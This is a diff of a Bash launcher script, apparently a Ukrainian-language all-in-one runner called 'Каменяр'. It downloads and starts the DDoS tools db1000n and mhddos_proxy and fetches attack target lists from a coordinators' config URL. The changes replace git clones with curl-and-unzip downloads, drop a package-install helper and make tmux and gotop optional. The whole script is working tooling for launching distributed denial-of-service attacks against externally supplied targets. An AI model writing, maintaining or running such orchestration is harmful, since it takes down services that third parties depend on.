@@ -3,7 +3,7 @@ set -e
 set -u
 set -o pipefail
 ###############################################################################
-export str_version="2.0.7b alpha"
+export str_version="2.0.9 alpha"
 ###############################################################################
 export opt_gotop="off"
 export opt_type="normal"
@@ -58,22 +58,37 @@ fi
 ###############################################################################
 export link_gotop_x32="https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_386.tgz"
 export link_gotop_x64="https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_amd64.tgz"
+
 export link_db1000n_x32="https://github.com/Arriven/db1000n/releases/latest/download/db1000n_linux_386.tar.gz"
 export link_db1000n_x64="https://github.com/Arriven/db1000n/releases/latest/download/db1000n_linux_amd64.tar.gz"
+
 export link_jq_x32="https://github.com/stedolan/jq/releases/download/jq-1.6/jq-linux32"
 export link_jq_x64="https://github.com/stedolan/jq/releases/download/jq-1.6/jq-linux64"
-export link_wondershaper="https://github.com/magnific0/wondershaper.git"
+
+export link_wondershaper="https://github.com/magnific0/wondershaper/archive/refs/heads/master.zip"
+
 export link_tmux_x64="https://github.com/mosajjal/binary-tools/raw/master/x64/tmux"
-export link_mhddos_proxy="https://github.com/LordWarWar/mhddos_proxy.git"
+
+export link_mhddos_proxy="https://github.com/LordWarWar/mhddos_proxy/archive/refs/heads/main.zip"
+
 export link_pip="https://bootstrap.pypa.io/get-pip.py"
+
 export link_cf_centos8="https://pkg.cloudflareclient.com/cloudflare-release-el8.rpm"
+
 export link_shtools="ftp://ftp.gnu.org/gnu/shtool/shtool-2.0.8.tar.gz"
+
+export link_7z_x64="https://www.7-zip.org/a/7z2201-linux-x64.tar.xz"
+export link_7z_x32="https://www.7-zip.org/a/7z2201-linux-x86.tar.xz"
+export link_7z_arm_x64="https://www.7-zip.org/a/7z2201-linux-arm64.tar.xz"
+export link_7z_arm_x32="https://www.7-zip.org/a/7z2201-linux-arm.tar.xz"
+
+export link_unzip="https://oss.oracle.com/el4/unzip/unzip.tar"
+
 # Array with targetlists went to get_targets()
 # Bash does not support array exporting
 export link_itarmy_json="https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json"
 # Array with paths went to get_targets()
 # bash does not support array exporting
-export helper_link_git="https://git--scm-com.translate.goog/download/linux?_x_tr_sl=en&_x_tr_tl=uk&_x_tr_hl=uk&_x_tr_pto=wapp"
 export helper_link_python="https://freehost.com.ua/ukr/faq/articles/kak-ustanovit-python-na-linux/"
 export link_banner="https://raw.githubusercontent.com/ahovdryk/aio_reaper/main/banner"
 
@@ -85,7 +100,7 @@ export str_ok="OK"
 export str_done="Виконано"
 export str_downloading="Завантажую"
 export str_probing="Перевіряю наявність"
-export str_motto="Лупайте сю скалу!"
+export str_motto="Зі смаком опенсорсу"
 export str_name="Каменяр"
 export str_found="знайдено."
 export str_startup="Стартує $str_name"
@@ -143,6 +158,7 @@ export internet_interface
 export script_jq="null"
 export script_tmux="null"
 export script_gotop="null"
+export script_unzip="null"
 
 export RED_TEXT='\033[0;31m'
 export NORM_TEXT='\033[0m'
@@ -222,7 +238,6 @@ then
     echo -ne '\007'
     print_error "${RED_TEXT}$str_running_as_root${NORM_TEXT}"
 fi
-
 ###############################################################################
 # Checking for write permissions to user folder
 mkdir -p "$script_path" > /dev/null 2>&1
@@ -239,29 +254,19 @@ cd "$script_path"
 mkdir -p "$script_path/bin" > /dev/null 2>&1
 mkdir -p "$script_path/targets" > /dev/null 2>&1
 ###############################################################################
-# Checking if we have python and git
-printf "%s Git... " "$str_probing"
-if ! command -v git &> /dev/null
+# Getting unzip
+if ! command -v unzip > /dev/null 2>&1
 then
-    printf "\n%s\n" "$str_notfound"
-    echo -ne '\007'
-    printf "%s\n" "$str_trying_install"
-    try_install "git"
-    if ! command -v git &> /dev/null
-    then
-        print_error "Git $str_notfound\n $str_fatal"
-        echo -ne '\007'
-        print_error "$str_instructions\n$helper_link_git"
-        printf "%s\n" "$str_press_any_key"
-        read -r
-        exit 0
-    fi
+    curl -s -L --url $link_unzip --output "$script_path/unzip.tar"
+    tar -xf "$script_path/unzip.tar" -C "$script_path/bin/"
+    chmod +x "$script_path/bin/unzip"
+    export script_unzip="$script_path/bin/unzip"
 else
-    printf "%s\n" "$str_found"
+    export script_unzip="unzip"
 fi
 ###############################################################################
 printf "%s Python 3... " "$str_probing"
-if ! command -v python3 &> /dev/null
+if ! command -v python3 > /dev/null 2>&1
 then
     print_error "\nPython $str_notfound\n $str_fatal"
     echo -ne '\007'
@@ -350,7 +355,7 @@ fi
 ###############################################################################
 # Checking if jq installed and grabbing a local copy if not
 printf "%s jq " "$str_probing"
-if ! command -v jq &> /dev/null
+if ! command -v jq > /dev/null 2>&1
 then
     # We have a local copy, use that
     if [[ -f "$script_path/bin/jq" ]]
@@ -386,44 +391,48 @@ else
 fi
 
 ###############################################################################
-# Checking for tmux
-printf "%s tmux... " "$str_probing"
-if ! command -v tmux &> /dev/null
+if [[ "$opt_gotop" == "on" ]]
 then
-    if [[ -f "$script_path/bin/tmux" ]]
+    # Checking for tmux
+    printf "%s tmux... " "$str_probing"
+    if ! command -v tmux > /dev/null 2>&1
     then
-        script_tmux="$script_path/bin/tmux"
+        if [[ -f "$script_path/bin/tmux" ]]
+        then
+            script_tmux="$script_path/bin/tmux"
+            export script_tmux
+            printf "%s\n" "$str_found"
+        fi
+        if [[ "$script_tmux" == "null" ]]
+        then
+            if [[ $os_bits == "64" ]]
+            then
+                curl -s -L --retry 10 --output "$script_path/bin/tmux" --url $link_tmux_x64
+                chmod +x "$script_path/bin/tmux"
+                script_tmux="$script_path/bin/tmux"
+                printf "%s\n" "$str_ok"
+            fi
+            if [[ $os_bits == "32" ]]
+            then
+                printf "\n %s" "$str_tmux_x32\n"
+                script_tmux="null"
+            fi
+        fi
+    else
+        script_tmux="tmux"
         export script_tmux
         printf "%s\n" "$str_found"
     fi
-    if [[ "$script_tmux" == "null" ]]
-    then
-        if [[ $os_bits == "64" ]]
-        then
-            curl -s -L --retry 10 --output "$script_path/bin/tmux" --url $link_tmux_x64
-            chmod +x "$script_path/bin/tmux"
-            script_tmux="$script_path/bin/tmux"
-            printf "%s\n" "$str_ok"
-        fi
-        if [[ $os_bits == "32" ]]
-        then
-            printf "\n %s" "$str_tmux_x32\n"
-            script_tmux="null"
-        fi
-    fi
-else
-    script_tmux="tmux"
-    export script_tmux
-    printf "%s\n" "$str_found"
 fi
 
 ###############################################################################
 # Checking for gotop
-if [[ $script_tmux == "null" ]]
+if [[ ($script_tmux == "null") && ($opt_gotop == "on") ]]
 then
     opt_gotop="off"
     printf "%s\n" "$str_no_tmux"
-else
+elif [[ $opt_gotop == "on" ]]
+    then
     printf "%s gotop... " "$str_probing"
     if ! command -v gotop &> /dev/null
     then
@@ -487,12 +496,11 @@ then
     printf "%s wondershaper... " "$str_probing"
     script_wondershaper="$script_path/bin/wondershaper/wondershaper"
     export script_wondershaper
-    if [[ ! -f $script_path/bin/wondershaper/wondershaper ]]
+    if [[ ! -f $script_wondershaper ]]
     then
         printf "%s\n" "$str_notfound"
         printf "%s wondershaper... " "$str_downloading"
-        cd "$script_path/bin"
-        git clone https://github.com/magnific0/wondershaper.git > /dev/null 2>&1
+        get_wondershaper
         printf "\t [OK]\n"
         chmod +x "$script_wondershaper"
         cd "$script_path"
@@ -801,6 +809,7 @@ function cleanup() {
     then
         printf "%s Cloudflare Warp: " "$str_cleaning"
         warp-cli disconnect || true
+        warp-cli rotate-keys || true > /dev/null 2>&1
     fi
     if [[ $opt_db1000n == "on" ]]
     then
@@ -821,46 +830,6 @@ function cleanup() {
     printf "%s\n" "$str_end"
 }
 export cleanup
-###############################################################################
-# If we want to try to install something
-###############################################################################
-function try_install() {
-    if command -v apt-get &> /dev/null
-    then
-        sudo apt-get -y install "$1"
-    elif command -v yum &> /dev/null
-    then
-        sudo yum install "$1"
-    elif command -v dnf &> /dev/null
-    then
-        sudo dnf install "$1"
-    elif command -v pacman &> /dev/null
-    then
-        sudo pacman -S "$1"
-    elif command -v zypper &> /dev/null
-    then
-        sudo zypper install "$1"
-    elif command -v urpmi &> /dev/null
-    then
-        sudo urpmi "$1"
-    elif command -v nix-env &> /dev/null
-    then
-        sudo nix-env -i "$1"
-    elif command -v pkg &> /dev/null
-    then
-        sudo pkg install "$1"
-    elif command -v pkgutil &> /dev/null
-    then
-        sudo pkgutil -i "$1"
-    elif command -v pkg_add &> /dev/null
-    then
-        sudo pkg_add "$1"
-    elif command -v apk &> /dev/null
-    then
-        sudo apk add "$1"
-    fi
-}
-export -f try_install
 ###############################################################################
 #
 ###############################################################################
@@ -897,7 +866,7 @@ while true; do
     rm -rf "$script_path/mhddos_proxy" > /dev/null 2>&1
     while [[ ! -d "$script_path/mhddos_proxy" ]]
     do
-        git clone "$link_mhddos_proxy" > /dev/null 2>&1
+        get_mhddos_proxy
     done
     cd "$script_path/mhddos_proxy" || return
     # shellcheck disable=1091
@@ -972,5 +941,22 @@ function skip_dependencies()
 }
 export -f skip_dependencies
 ###############################################################################
+function get_mhddos_proxy(){
+    curl -s -L --url $link_mhddos_proxy --output "$script_path/mhddos_proxy.zip"
+    $script_unzip "$script_path/mhddos_proxy.zip" -d "$script_path" > /dev/null 2>&1
+    mv "$script_path/mhddos_proxy-main" "$script_path/mhddos_proxy"
+    rm -f "$script_path/mhddos_proxy.zip"
+}
+export -f get_mhddos_proxy
+###############################################################################
+function get_wondershaper(){
+    curl -s -L --url $link_wondershaper --output "$script_path/wondershaper.zip"
+    $script_unzip "$script_path/wondershaper.zip" -d "$script_path" > /dev/null 2>&1
+    mv "$script_path/wondershaper-master" "$script_path/bin/wondershaper"
+    rm -f "$script_path/wondershaper.zip"
+}
+export -f get_wondershaper
+###############################################################################
+
 trap cleanup INT
 main "$@"; exit
